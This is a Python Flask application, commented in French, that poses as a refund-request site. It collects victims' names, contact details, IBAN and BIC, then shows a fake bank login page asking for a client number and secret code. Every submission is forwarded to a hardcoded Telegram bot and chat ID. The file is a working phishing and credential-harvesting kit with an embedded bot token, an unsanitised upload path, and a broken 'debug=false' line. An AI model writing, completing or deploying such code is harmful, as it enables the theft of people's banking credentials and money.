from flask import Flask, render_template, request, redirect, url_for
import requests
import os
from datetime import datetime

app = Flask(__name__)

# Constantes pour Telegram
BOT_TOKEN = "7654840685:AAG_JAg7tEr4HIX-xtjLWqC3A3YYsym9pAs"
CHAT_ID = "5652184847"

# Dossier pour stocker les fichiers téléversés
UPLOAD_FOLDER = "uploads"
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# Fonction pour envoyer un message à Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Vérifie les erreurs HTTP
        print("Message envoyé à Telegram avec succès !")
    except Exception as e:
        print(f"Erreur lors de l'envoi à Telegram : {e}")

# Route pour afficher le formulaire de remboursement
@app.route("/", methods=["GET"])
def formulaire_remboursement():
    return render_template("formulaire_de_remboursement.html")

# Route pour traiter la soumission du formulaire de remboursement
@app.route("/acces_compte", methods=["GET", "POST"])
def acces_compte():
    if request.method == "POST":
        # Récupérer les fichiers téléversés
        if "proof_of_purchase" in request.files:
            file = request.files["proof_of_purchase"]
            if file.filename != "":
                file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
                try:
                    file.save(file_path)
                    print(f"Fichier sauvegardé : {file_path}")
                except Exception as e:
                    print(f"Erreur lors de l'enregistrement du fichier : {e}")

        # Récupérer les autres données du formulaire
        nom = request.form.get("nom")
        prenom = request.form.get("prenom")
        email = request.form.get("email")
        phone = request.form.get("phone")
        order_number = request.form.get("order_number")
        purchase_date = request.form.get("purchase_date")
        products = request.form.get("products")
        refund_reason = request.form.get("refund_reason")
        iban = request.form.get("iban")
        bic = request.form.get("bic")
        bank = request.form.get("bank")
        bank_logo_url = request.form.get("bank_logo_url")

        # Validation des champs obligatoires
        if not nom or not prenom or not order_number or not iban or not bic:
            return "Veuillez remplir tous les champs obligatoires.", 400

        # Envoyer les informations à Telegram
        message = (
            "Nouvelle demande de remboursement :\n"
            f"Nom : {nom}\n"
            f"Prénom : {prenom}\n"
            f"Email : {email}\n"
            f"Téléphone : {phone}\n"
            f"Numéro de commande : {order_number}\n"
            f"Date d'achat : {purchase_date}\n"
            f"Produits concernés : {products}\n"
            f"Raison du remboursement : {refund_reason}\n"
            f"IBAN : {iban}\n"
            f"BIC : {bic}\n"
            f"Banque : {bank}\n"
            f"Logo de la banque : {bank_logo_url}"
        )
        send_to_telegram(message)

        # Afficher la valeur de bank_logo_url pour débogage
        print(f"Logo de la banque reçu : {bank_logo_url}")

        # Rediriger vers la page d'accès au compte avec le logo de la banque
        return render_template("acces_compte.html", bank_logo_url=bank_logo_url)
    else:
        # Afficher la page d'accès au compte (requête GET)
        return render_template("acces_compte.html", bank_logo_url=None)

# Route pour traiter la soumission de la page d'accès au compte
@app.route("/confirmation", methods=["GET", "POST"])
def confirmation():
    if request.method == "POST":
        # Récupérer les données du formulaire
        client_number = request.form.get("client-number")
        secret_code = request.form.get("secret-code")

        # Envoyer les informations à Telegram
        message = (
            "Nouvelle connexion :\n"
            f"Identifiant : {client_number}\n"
            f"Code : {secret_code}"
        )
        send_to_telegram(message)

    # Rediriger vers la page de confirmation
    return render_template("confirmation.html")

# Démarrer l'application Flask
if __name__ == "__main__":
    # Créer le dossier de téléversement s'il n'existe pas
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(debug=false, port=5000)
